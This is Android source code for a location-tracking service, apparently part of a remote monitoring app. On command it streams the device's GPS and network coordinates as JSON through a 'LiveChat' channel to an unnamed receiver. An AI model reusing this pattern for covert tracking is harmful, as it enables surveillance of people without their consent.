package com.icontrol.protector;
import android.Manifest;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

public class LocationMonitor extends Service {

    private LocationListener myLoListener;
    private LocationManager myLoManager;
    private boolean isActive = false;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    private static int Notifi_ID = 111;
    private void startForegroundService(Context ctx) {
        try{
           // int Notifi_ID = UtliTools.randomnumber(11111, 88888);
            MyNotification MyNotifiint = MyNotification.getInstance(ctx);
            Notification notification = MyNotifiint.createNotification(ctx);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
            } else {
                this.startForeground(Notifi_ID, notification);
            }
        }catch (Exception a){}

    }

    private void startLocationTracking() {
        if (isActive) return;

        isActive = true;

        myLoManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        myLoListener = new LocationListener() {
            @Override
            public void onLocationChanged(@NonNull Location location) {
                if (!isActive) return;

                double latitude = location.getLatitude();
                double longitude = location.getLongitude();

                MyLoger.Debug("test location:", latitude + " ---- " + longitude);

                try {
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("type", id_Commands.Location);
                    jsonObject.put("ltd", latitude);
                    jsonObject.put("lgd", longitude);

                    String jsonData = jsonObject.toString();
                    LiveChat.instance(getApplicationContext()).Livemessage(getApplicationContext(), jsonData);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {
                // Optional: can be empty
            }

            @Override
            public void onProviderEnabled(String provider) {}

            @Override
            public void onProviderDisabled(String provider) {}
        };

        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            myLoManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, myLoListener);
            myLoManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, myLoListener);
        }
    }

    private void stopLocationTracking() {
        isActive = false;

        if (myLoManager != null && myLoListener != null) {
            myLoManager.removeUpdates(myLoListener);
            myLoListener = null;
        }

        stopForeground(false);
        stopSelf();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if ("start".equals(action)) {
            startForegroundService(getApplicationContext());
            startLocationTracking();
        } else if ("stop".equals(action)) {
            stopLocationTracking();
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        stopLocationTracking();
        super.onDestroy();
    }
}

